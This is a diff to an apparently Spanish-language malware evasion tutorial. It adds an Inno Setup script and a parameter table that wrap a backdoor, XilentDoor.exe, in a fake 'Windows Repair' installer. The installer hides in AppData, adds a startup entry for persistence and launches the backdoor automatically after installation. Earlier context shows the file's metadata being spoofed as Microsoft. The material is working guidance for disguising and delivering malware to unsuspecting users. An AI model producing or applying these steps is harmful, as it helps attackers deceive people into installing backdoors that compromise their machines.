@@ -94,7 +94,41 @@ rcedit-x64.exe XilentDoor.exe --set-version-string "CompanyName" "Microsoft Corp
 
 <img width="1362" height="562" alt="evasion-metada" src="https://github.com/user-attachments/assets/c7a9ad56-1281-48d0-abf2-56d03128851a" />
 
-Luego empaquetaremos el .EXE/.MSI en un installer utilizando herramientas como <a href="https://jrsoftware.org/isdl.php">Inno SetUp</a> o <a href="https://nsis.sourceforge.io/Main_Page">NSIS</a>. En mi caso utilizaré Inno, 
+Luego empaquetaremos el .EXE/.MSI en un installer utilizando herramientas como <a href="https://jrsoftware.org/isdl.php">Inno SetUp</a> o <a href="https://nsis.sourceforge.io/Main_Page">NSIS</a>. En mi caso utilizaré Inno, luego de escribir los metadatos del .EXE debemos de crear un script con el nombre `instalador.iss` con el siguiente contenido:
+```python
+[Setup]
+AppName=Windows Tool
+AppVersion=1.3.5.0
+DefaultDirName={localappdata}\WindowsRepair
+DisableProgramGroupPage=yes
+OutputDir=.
+OutputBaseFilename=installer_windows_tool
+Compression=lzma
+SolidCompression=yes
+
+[Files]
+Source: "C:\Users\Usuario\Desktop\MALWARE\Evasion\XilentDoor.exe"; DestDir: "{app}"; Flags: ignoreversion
+
+[Icons]
+Name: "{userstartup}\Windows Repair"; Filename: "{app}\XilentDoor.exe"; IconFilename: "{app}\XilentDoor.exe"
+
+[Run]
+Filename: "{app}\XilentDoor.exe"; Description: "Ejecutando Windows Repair..."; Flags: nowait postinstall skipifsilent
+```
+
+| PARÁMETRO | DESCRIPCIÓN |
+| ------------- | ------------- |
+| AppName y AppVersion | Nombre visible del programa falso. |
+| DefaultDirName | Instala en AppData\WindowsAudio (poco sospechoso). |
+| OutputDir | El .exe del instalador se guardará en el mismo directorio. |
+| Files | Copia XilentDoor.exe a la carpeta destino. |
+| Icons | Crea una entrada en Inicio → Ejecutar al iniciar sesión. |
+| Run | Ejecuta el backdoor automáticamente tras la instalación. |
+
+En el menu de Inno le damos a `Build` **->** `Compile`.
+
+<img width="1365" height="621" alt="evasion-installerSetUp" src="https://github.com/user-attachments/assets/0af34abb-d04b-4a7b-8374-f96c6759b156" />
+
 
 <h1 align="center"></h1>
 
